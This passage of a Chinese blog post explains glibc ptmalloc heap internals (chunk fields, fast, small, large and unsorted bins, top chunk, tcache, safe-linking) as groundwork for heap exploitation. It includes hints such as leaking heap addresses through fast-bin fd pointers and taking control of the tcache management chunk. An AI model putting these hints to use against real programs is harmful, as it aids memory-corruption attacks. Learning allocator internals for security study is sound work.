<li><p><code>size</code>：该 <code>chunk</code> 的大小，大小必须是 <code>2 * SIZE_SZ</code> 的整数倍。该字段的低三个比特位对 <code>chunk</code> 的大小没有影响，它们从高到低分别表示为：</p>
<ul>
<li><code>NON_MAIN_ARENA</code>，记录当前 <code>chunk</code> 是否不属于主线程，1 表示不属于，0 表示属于。</li>
<li><code>IS_MAPPED</code>，记录当前 <code>chunk</code> 是否是由 <code>mmap</code> 分配的。</li>
<li><code>PREV_INUSE</code>，记录前一个 <code>chunk</code> 块是否被分配。一般来说，堆中第一个被分配的内存块的 <code>size</code> 字段的 <code>P</code> 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 <code>chunk</code> 的 <code>size</code> 的 <code>P</code> 位为 0 时，我们能通过 <code>prev_size</code> 字段来获取上一个 <code>chunk</code> 的大小以及地址。这也方便进行空闲 <code>chunk</code> 之间的合并。</li>
</ul>
</li>
<li><p><code>fd</code>，<code>bk</code>。 <code>chunk</code> 处于分配状态时，从 <code>fd</code> 字段开始是用户的数据。<code>chunk</code> 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下</p>
<ul>
<li><code>fd</code> 指向下一个（非物理相邻）空闲的 <code>chunk</code></li>
<li><code>bk</code> 指向上一个（非物理相邻）空闲的 <code>chunk</code></li>
</ul>
<p>通过 <code>fd</code> 和 <code>bk</code> 可以将空闲的 <code>chunk</code> 块加入到空闲的 <code>chunk</code> 块链表进行统一管理</p>
</li>
<li><p><code>fd_nextsize</code>， <code>bk_nextsize</code>，也是只有 <code>chunk</code> 空闲的时候才使用，不过其用于较大的 <code>chunk</code>（large chunk）。</p>
<ul>
<li><code>fd_nextsize</code> 指向前一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 <code>bin</code> 的头指针。</li>
<li><code>bk_nextsize</code> 指向后一个与当前 <code>chunk</code> 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
<li>一般空闲的 large chunk 在 <code>fd</code> 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 <code>chunk</code> 时挨个遍历。（<del>好在 large bin 限制了值域范围，不然也会很慢</del> ）</li>
</ul>
</li>
</ul>
<p><code>chunk</code> 的结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f439d9936936ea9634731a2829b84bcf.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><h2 id="bins-1"><a href="#bins-1" class="headerlink" title="bins"></a>bins</h2><p>我们曾经说过，用户释放掉的 <code>chunk</code> 不会马上归还给系统，ptmalloc 会统一管理 <code>heap</code> 和 <code>mmap</code> 映射区域中的空闲的 <code>chunk</code>。当用户再一次请求分配内存时，<code>ptmalloc</code> 分配器会试图在空闲的 <code>chunk</code> 中挑选一块合适的给用户。这样可以避免频繁的系统调用，降低内存分配的开销。<br>在具体的实现中，ptmalloc 采用分箱式方法对空闲的 <code>chunk</code> 进行管理。首先，它会根据空闲的 <code>chunk</code> 的大小以及使用状态将 <code>chunk</code> 初步分为 4 类：fast bins，small bins，large bins，unsorted bin 。对于 libc2.26 以上版本还有 <code>tcache</code> 。</p>
<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>对于 small bins，large bins，unsorted bin 来说，ptmalloc 将它们维护在一个 <code>bins</code> 数组中。这些 <code>bin</code> 对应的数据结构在 <code>malloc_state</code> 中，如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NBINS 128</span></span><br><span class="line"><span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br></pre></td></tr></table></figure></div>

<p><code>bins</code> 数组实际上可以看做是以 <code>chunk</code> 为单位，只不过采用空间复用策略，因为实际用到的只有 <code>fd</code> 和 <code>bk</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* addressing -- note that bin_at(0) does not exist */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bin_at(m, i) \</span></span><br><span class="line"><span class="meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span></span><br><span class="line"><span class="meta">             - offsetof (struct malloc_chunk, fd))</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/9d6b2cc483c3f8a156e4c445dc0e4797.png"
                      alt="在这里插入图片描述"
                ><br>由于是双链表结构 <code>bins</code> 数组每连续两个 <code>chunk</code> 指针维护一个 <code>bin</code>（即 <code>fd</code> 和 <code>bk</code> ），其结构如下图所示（64位）。其中 small bins 中 <code>chunk</code> 大小已给出。large bins 的每个 <code>bin</code> 中的 <code>chunk</code> 大小在一个范围内。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/08c0ec1b811090f35577a73cebba6a99.png"
                      alt="在这里插入图片描述"
                ><br> large bin 的 <code>chunk</code> 范围如下：</p>
<table>
<thead>
<tr>
<th>编号</th>
<th>64位最小</th>
<th>64位最大</th>
<th>64位公差</th>
<th>32位最小</th>
<th>32位最大</th>
<th>32位公差</th>
</tr>
</thead>
<tbody><tr>
<td>64</td>
<td>0x400</td>
<td>0x430</td>
<td>0x40</td>
<td>0x200</td>
<td>0x238</td>
<td>0x40</td>
</tr>
<tr>
<td>65</td>
<td>0x440</td>
<td>0x470</td>
<td>0x40</td>
<td>0x240</td>
<td>0x278</td>
<td>0x40</td>
</tr>
<tr>
<td>66</td>
<td>0x480</td>
<td>0x4b0</td>
<td>0x40</td>
<td>0x280</td>
<td>0x2b8</td>
<td>0x40</td>
</tr>
<tr>
<td>67</td>
<td>0x4c0</td>
<td>0x4f0</td>
<td>0x40</td>
<td>0x2c0</td>
<td>0x2f8</td>
<td>0x40</td>
</tr>
<tr>
<td>68</td>
<td>0x500</td>
<td>0x530</td>
<td>0x40</td>
<td>0x300</td>
<td>0x338</td>
<td>0x40</td>
</tr>
<tr>
<td>69</td>
<td>0x540</td>
<td>0x570</td>
<td>0x40</td>
<td>0x340</td>
<td>0x378</td>
<td>0x40</td>
</tr>
<tr>
<td>70</td>
<td>0x580</td>
<td>0x5b0</td>
<td>0x40</td>
<td>0x380</td>
<td>0x3b8</td>
<td>0x40</td>
</tr>
<tr>
<td>71</td>
<td>0x5c0</td>
<td>0x5f0</td>
<td>0x40</td>
<td>0x3c0</td>
<td>0x3f8</td>
<td>0x40</td>
</tr>
<tr>
<td>72</td>
<td>0x600</td>
<td>0x630</td>
<td>0x40</td>
<td>0x400</td>
<td>0x438</td>
<td>0x40</td>
</tr>
<tr>
<td>73</td>
<td>0x640</td>
<td>0x670</td>
<td>0x40</td>
<td>0x440</td>
<td>0x478</td>
<td>0x40</td>
</tr>
<tr>
<td>74</td>
<td>0x680</td>
<td>0x6b0</td>
<td>0x40</td>
<td>0x480</td>
<td>0x4b8</td>
<td>0x40</td>
</tr>
<tr>
<td>75</td>
<td>0x6c0</td>
<td>0x6f0</td>
<td>0x40</td>
<td>0x4c0</td>
<td>0x4f8</td>
<td>0x40</td>
</tr>
<tr>
<td>76</td>
<td>0x700</td>
<td>0x730</td>
<td>0x40</td>
<td>0x500</td>
<td>0x538</td>
<td>0x40</td>
</tr>
<tr>
<td>77</td>
<td>0x740</td>
<td>0x770</td>
<td>0x40</td>
<td>0x540</td>
<td>0x578</td>
<td>0x40</td>
</tr>
<tr>
<td>78</td>
<td>0x780</td>
<td>0x7b0</td>
<td>0x40</td>
<td>0x580</td>
<td>0x5b8</td>
<td>0x40</td>
</tr>
<tr>
<td>79</td>
<td>0x7c0</td>
<td>0x7f0</td>
<td>0x40</td>
<td>0x5c0</td>
<td>0x5f8</td>
<td>0x40</td>
</tr>
<tr>
<td>80</td>
<td>0x800</td>
<td>0x830</td>
<td>0x40</td>
<td>0x600</td>
<td>0x638</td>
<td>0x40</td>
</tr>
<tr>
<td>81</td>
<td>0x840</td>
<td>0x870</td>
<td>0x40</td>
<td>0x640</td>
<td>0x678</td>
<td>0x40</td>
</tr>
<tr>
<td>82</td>
<td>0x880</td>
<td>0x8b0</td>
<td>0x40</td>
<td>0x680</td>
<td>0x6b8</td>
<td>0x40</td>
</tr>
<tr>
<td>83</td>
<td>0x8c0</td>
<td>0x8f0</td>
<td>0x40</td>
<td>0x6c0</td>
<td>0x6f8</td>
<td>0x40</td>
</tr>
<tr>
<td>84</td>
<td>0x900</td>
<td>0x930</td>
<td>0x40</td>
<td>0x700</td>
<td>0x738</td>
<td>0x40</td>
</tr>
<tr>
<td>85</td>
<td>0x940</td>
<td>0x970</td>
<td>0x40</td>
<td>0x740</td>
<td>0x778</td>
<td>0x40</td>
</tr>
<tr>
<td>86</td>
<td>0x980</td>
<td>0x9b0</td>
<td>0x40</td>
<td>0x780</td>
<td>0x7b8</td>
<td>0x40</td>
</tr>
<tr>
<td>87</td>
<td>0x9c0</td>
<td>0x9f0</td>
<td>0x40</td>
<td>0x7c0</td>
<td>0x7f8</td>
<td>0x40</td>
</tr>
<tr>
<td>88</td>
<td>0xa00</td>
<td>0xa30</td>
<td>0x40</td>
<td>0x800</td>
<td>0x838</td>
<td>0x40</td>
</tr>
<tr>
<td>89</td>
<td>0xa40</td>
<td>0xa70</td>
<td>0x40</td>
<td>0x840</td>
<td>0x878</td>
<td>0x40</td>
</tr>
<tr>
<td>90</td>
<td>0xa80</td>
<td>0xab0</td>
<td>0x40</td>
<td>0x880</td>
<td>0x8b8</td>
<td>0x40</td>
</tr>
<tr>
<td>91</td>
<td>0xac0</td>
<td>0xaf0</td>
<td>0x40</td>
<td>0x8c0</td>
<td>0x8f8</td>
<td>0x40</td>
</tr>
<tr>
<td>92</td>
<td>0xb00</td>
<td>0xb30</td>
<td>0x40</td>
<td>0x900</td>
<td>0x938</td>
<td>0x40</td>
</tr>
<tr>
<td>93</td>
<td>0xb40</td>
<td>0xb70</td>
<td>0x40</td>
<td>0x940</td>
<td>0x978</td>
<td>0x40</td>
</tr>
<tr>
<td>94</td>
<td>0xb80</td>
<td>0xbb0</td>
<td>0x40</td>
<td>0x980</td>
<td>0x9b8</td>
<td>0x40</td>
</tr>
<tr>
<td>95</td>
<td>0xbc0</td>
<td>0xbf0</td>
<td>0x40</td>
<td>0x9c0</td>
<td>0x9f8</td>
<td>0x40</td>
</tr>
<tr>
<td>96</td>
<td>0xc00</td>
<td>0xc30</td>
<td>0x40</td>
<td>0xa00</td>
<td>0xbf8</td>
<td>0x200</td>
</tr>
<tr>
<td>97</td>
<td>0xc40</td>
<td>0xdf0</td>
<td>0x1c0</td>
<td>0xc00</td>
<td>0xdf8</td>
<td>0x200</td>
</tr>
<tr>
<td>98</td>
<td>0xe00</td>
<td>0xff0</td>
<td>0x200</td>
<td>0xe00</td>
<td>0xff8</td>
<td>0x200</td>
</tr>
<tr>
<td>99</td>
<td>0x1000</td>
<td>0x11f0</td>
<td>0x200</td>
<td>0x1000</td>
<td>0x11f8</td>
<td>0x200</td>
</tr>
<tr>
<td>100</td>
<td>0x1200</td>
<td>0x13f0</td>
<td>0x200</td>
<td>0x1200</td>
<td>0x13f8</td>
<td>0x200</td>
</tr>
<tr>
<td>101</td>
<td>0x1400</td>
<td>0x15f0</td>
<td>0x200</td>
<td>0x1400</td>
<td>0x15f8</td>
<td>0x200</td>
</tr>
<tr>
<td>102</td>
<td>0x1600</td>
<td>0x17f0</td>
<td>0x200</td>
<td>0x1600</td>
<td>0x17f8</td>
<td>0x200</td>
</tr>
<tr>
<td>103</td>
<td>0x1800</td>
<td>0x19f0</td>
<td>0x200</td>
<td>0x1800</td>
<td>0x19f8</td>
<td>0x200</td>
</tr>
<tr>
<td>104</td>
<td>0x1a00</td>
<td>0x1bf0</td>
<td>0x200</td>
<td>0x1a00</td>
<td>0x1bf8</td>
<td>0x200</td>
</tr>
<tr>
<td>105</td>
<td>0x1c00</td>
<td>0x1df0</td>
<td>0x200</td>
<td>0x1c00</td>
<td>0x1df8</td>
<td>0x200</td>
</tr>
<tr>
<td>106</td>
<td>0x1e00</td>
<td>0x1ff0</td>
<td>0x200</td>
<td>0x1e00</td>
<td>0x1ff8</td>
<td>0x200</td>
</tr>
<tr>
<td>107</td>
<td>0x2000</td>
<td>0x21f0</td>
<td>0x200</td>
<td>0x2000</td>
<td>0x21f8</td>
<td>0x200</td>
</tr>
<tr>
<td>108</td>
<td>0x2200</td>
<td>0x23f0</td>
<td>0x200</td>
<td>0x2200</td>
<td>0x23f8</td>
<td>0x200</td>
</tr>
<tr>
<td>109</td>
<td>0x2400</td>
<td>0x25f0</td>
<td>0x200</td>
<td>0x2400</td>
<td>0x25f8</td>
<td>0x200</td>
</tr>
<tr>
<td>110</td>
<td>0x2600</td>
<td>0x27f0</td>
<td>0x200</td>
<td>0x2600</td>
<td>0x27f8</td>
<td>0x200</td>
</tr>
<tr>
<td>111</td>
<td>0x2800</td>
<td>0x29f0</td>
<td>0x200</td>
<td>0x2800</td>
<td>0x29f8</td>
<td>0x200</td>
</tr>
<tr>
<td>112</td>
<td>0x2a00</td>
<td>0x2ff0</td>
<td>0x600</td>
<td>0x2a00</td>
<td>0x2ff8</td>
<td>0x600</td>
</tr>
<tr>
<td>113</td>
<td>0x3000</td>
<td>0x3ff0</td>
<td>0x1000</td>
<td>0x3000</td>
<td>0x3ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>114</td>
<td>0x4000</td>
<td>0x4ff0</td>
<td>0x1000</td>
<td>0x4000</td>
<td>0x4ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>115</td>
<td>0x5000</td>
<td>0x5ff0</td>
<td>0x1000</td>
<td>0x5000</td>
<td>0x5ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>116</td>
<td>0x6000</td>
<td>0x6ff0</td>
<td>0x1000</td>
<td>0x6000</td>
<td>0x6ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>117</td>
<td>0x7000</td>
<td>0x7ff0</td>
<td>0x1000</td>
<td>0x7000</td>
<td>0x7ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>118</td>
<td>0x8000</td>
<td>0x8ff0</td>
<td>0x1000</td>
<td>0x8000</td>
<td>0x8ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>119</td>
<td>0x9000</td>
<td>0x9ff0</td>
<td>0x1000</td>
<td>0x9000</td>
<td>0x9ff8</td>
<td>0x1000</td>
</tr>
<tr>
<td>120</td>
<td>0xa000</td>
<td>0xfff0</td>
<td>0x6000</td>
<td>0xa000</td>
<td>0xfff8</td>
<td>0x6000</td>
</tr>
<tr>
<td>121</td>
<td>0x10000</td>
<td>0x17ff0</td>
<td>0x8000</td>
<td>0x10000</td>
<td>0x17ff8</td>
<td>0x8000</td>
</tr>
<tr>
<td>122</td>
<td>0x18000</td>
<td>0x1fff0</td>
<td>0x8000</td>
<td>0x18000</td>
<td>0x1fff8</td>
<td>0x8000</td>
</tr>
<tr>
<td>123</td>
<td>0x20000</td>
<td>0x27ff0</td>
<td>0x8000</td>
<td>0x20000</td>
<td>0x27ff8</td>
<td>0x8000</td>
</tr>
<tr>
<td>124</td>
<td>0x28000</td>
<td>0x3fff0</td>
<td>0x18000</td>
<td>0x28000</td>
<td>0x3fff8</td>
<td>0x18000</td>
</tr>
<tr>
<td>125</td>
<td>0x40000</td>
<td>0x7fff0</td>
<td>0x40000</td>
<td>0x40000</td>
<td>0x7fff8</td>
<td>0x40000</td>
</tr>
<tr>
<td>126</td>
<td>0x80000</td>
<td>inf</td>
<td></td>
<td>0x80000</td>
<td>inf</td>
<td></td>
</tr>
</tbody></table>
<p>对于 fast bin ，在 <code>malloc_state</code> 又单独定义了一个 <code>fastbinsY</code> 的结构维护。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> *mfastbinptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This is in malloc_state.</span></span><br><span class="line"><span class="comment">    /* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></div>
<p>由于 fast bin 为单链表结构，因此数组中一个指针就可以维护一个 <code>bin</code> 。结构如图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/2c72c332b07fc4f69047f8afdd7dff79.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="Fast-Bin"><a href="#Fast-Bin" class="headerlink" title="Fast Bin"></a>Fast Bin</h3><p>为了避免大部分时间花在了合并、分割以及中间检查的过程中影响效率，因此 ptmalloc 中专门设计了 fast bin。</p>
<p>fast bin 采用单链表形式，结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4aab9d846457a48f637c2d5a244af954.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>fast bin 有如下性质：</p>
<ul>
<li>由于采用单链表结构，fast bin 采取 LIFO 策略。</li>
<li>每个 fast bin 中维护的 chunk 大小确定，并且 fast bin 维护的最大的 <code>chunk</code> 为 128 字节（64位），因此不超过 0x80（<code>chunk</code> 大小）的内存释放会进入 fast bin 。</li>
<li>fast bin 范围的 <code>chunk</code> <strong>下一个相邻 <code>chunk</code></strong> 的 <code>PREV_INUSE</code> 始终被置为 1。因此它们不会和其它被释放的 <code>chunk</code> 合并。除非调用 <code>malloc_consolidate</code> 函数。</li>
</ul>
<p>安全检查：</p>
<ul>
<li><p><code>size</code>：在 <code>malloc()</code> 函数分配 fastbin size 范围的 <code>chunk</code> 时，若是对应的 <code>fastbin</code> 中有空闲 <code>chunk</code>，在取出前会检查其 <code>size</code> 域与对应下标是否一致，不会检查标志位，若否便会触发<code>abort</code> 。</p>
</li>
<li><p>double free：在 <code>free()</code> 函数中会对 fast bin 链表的头结点进行检查，若将要被放入 fast bin 中的 <code>chunk</code> 与对应下标的链表的头结点为同一 <code>chunk</code>，则会触发 <code>abort</code> 。</p>
</li>
<li><p>Safe linking 机制（only glibc2.32 and up）：自 glibc 2.32 起引入了 safe-linking 机制，其核心思想是在链表上的 <code>chunk</code> 中并不直接存放其所连接的下一个 <code>chunk</code> 的地址，而是存放下一个 <code>chunk</code> 的地址与【 <code>fd</code> 指针自身地址右移 12位】所异或得的值，使得攻击者在得知该 <code>chunk</code> 的地址之前无法直接利用其构造任意地址写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure></div>

<p>需要注意的是 fast bin 的入口节点存放的仍是未经异或的 <code>chunk</code> 地址。<br>另外第一个加入 fast bin 的 <code>chunk</code> 的 <code>fd</code> 字段可以泄露堆地址（右移 12 位）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">	fb = &amp;fastbin (av, idx);</span><br><span class="line">	mchunkptr old = *fb, old2;</span><br><span class="line">	...</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line">*fb = p;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="Small-Bin"><a href="#Small-Bin" class="headerlink" title="Small Bin"></a>Small Bin</h3><p>small bin 采用双向链表，结构如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/86163676dc9adde0954c070bc0eeef6a.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>small bin 有如下性质：</p>
<ul>
<li>small bins 中每个 <code>bin</code> 对应的链表采用 FIFO 的规则。</li>
<li>每个 small bin 维护的 <code>chunk</code> 大小确定，并且 small bin 维护的最大的 <code>chunk</code> 为 1008 字节（64位），即 0x3f0 的 <code>chunk</code> 大小。</li>
</ul>
<h3 id="Large-Bin"><a href="#Large-Bin" class="headerlink" title="Large Bin"></a>Large Bin</h3><p>large bins 中一共包括 63 个 <code>bin</code>，每个 <code>bin</code> 中的 <code>chunk</code> 的大小不一致，而是处于一定区间范围内。large bin 的结构如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/f3b03f72266a82c4dfe82b7dda5bcfed.png"
                      alt="在这里插入图片描述"
                ><br>关于 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 的机制，这里以 <code>fd_nextsize</code> 为例：</p>
<ul>
<li><code>fd_nextsize</code> 和 <code>bk_nextsize</code> 与 <code>bins</code> 数组没有连接关系（这就解释了为什么 <code>bins</code> 上 没有体现 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 结构）。</li>
<li>large bin 里的 <code>chunk</code> 在 <code>fd</code> 指针指向的方向上按照 <code>chunk</code> 大小降序排序。</li>
<li>当 large bin 里有一个 <code>chunk</code> 时， <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指向自己（如上面 large bin 的结构图所示）。</li>
<li>当 large bin 里同一大小的 <code>chunk</code> 有多个时，只有相同大小 <code>chunk</code> 中的第一个的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针有效，其余的 <code>chunk</code> 的 <code>fd_nextsize</code> 和 <code>bk_nextsize</code>  设为 NULL 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/8e05f44b0395a5b18b622a0707184874.png"
                      alt="在这里插入图片描述"
                ></li>
<li>large bin 中有多个不同大小的 <code>chunk</code> 时 <code>fd_nextsize</code> 连接比它小的第一个 <code>chunk</code> ，<code>bk_nextsize</code> 就是把 <code>fd_nextsize</code> 反过来连到对应结构上。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/64b10a726bbcc36d3ec99900a9e8237e.png"
                      alt="在这里插入图片描述"
                ></li>
<li>large bin 最小的一组 <code>chunk</code> 中的第一个 <code>chunk</code> 的 <code>fd_nextsize</code> 连接的是最大的 <code>chunk</code>，最大的 <code>chunk</code> 的 <code>bk_nextsize</code> 相反。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/0d80fe66f57e24c95ac69650b80f81c7.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h3 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h3><p>unsorted bin 可以视为空闲 <code>chunk</code> 回归其所属 <code>bin</code> 之前的缓冲区。像 small bin 一样采用双向链表维护。<code>chunk</code> 大小乱序。</p>
<h2 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h2><p>程序第一次进行 <code>malloc</code> 的时候，<code>heap</code> 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 <code>chunk</code> 。这个 <code>chunk</code> 不属于任何一个 <code>bin</code> ，它的作用在于当所有的 <code>bin</code> 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 <code>heap</code> 进行扩展后再进行分配。在 <code>main_arena</code> 中通过 <code>sbrk</code> 扩展 <code>heap</code>，而在 <code>thread arena</code> 中通过 <code>mmap</code> 分配新的 <code>heap </code>。<br>需要注意的是，top chunk 的 <code>prev_inuse</code> 比特位始终为 1，否则其前面的 <code>chunk</code> 就会被合并到 top chunk 中。</p>
<h2 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h2><p>在用户使用 <code>malloc</code> 请求分配内存时，ptmalloc2 找到的 <code>chunk</code> 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为 <code>last_remainder</code> 。</p>
<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><p><code>tcache</code> 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能，与 fast bin 类似。<code>tcache</code> 引入了两个新的结构体，<code>tcache_entry</code> 和 <code>tcache_perthread_struct</code> 。</p>
<p><code>tcache_entry</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_entry</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">tcache_entry</span> *next;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></div>

<p><code>tcache_entry</code> 用于链接空闲的 <code>chunk</code> 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。需要注意的是这里的 <code>next</code> 指向 <code>chunk</code> 的 user data，而 fast bin 的 <code>fd</code> 指向 <code>chunk</code> 开头的地址。而且，<code>tcache_entry</code> 会复用空闲 <code>chunk</code> 的 user data 部分。</p>
<p><code>tcache_perthread_struct</code> 定义如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">tcache_perthread_struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure></div>
<p>对应结构如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit-basic-knowlege/images/b095b05bdaa8e1675787b765e1f4b332.png"
                      alt="在这里插入图片描述"
                ><br>每个 thread 都会维护一个 <code>tcache_perthread_struct</code> ，它是整个 <code>tcache</code> 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code> 项 <code>tcache_entry</code>。这个结构在 <code>tcache_init</code> 函数中被初始化在堆上，大小为 0x250（高版本为 0x290）。其中数据部分前 0x40 为 <code>counts</code> ，剩下的为 <code>entries</code> 结构。如果能控制这个堆块就可以控制整个 <code>tcache</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<p><code>tcache_perthread_struct</code> 中的 <code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（<code>free</code> 后）的 <code>chunk</code>，这一点上和 fast bin 很像。</p>
<p>另外与 fast bin 相同的是释放进入 <code>tcache</code> 的 <code>chunk</code> 的下一个相邻 <code>chunk</code> 的 <code>PREV_INUSE</code> 位不清零。</p>
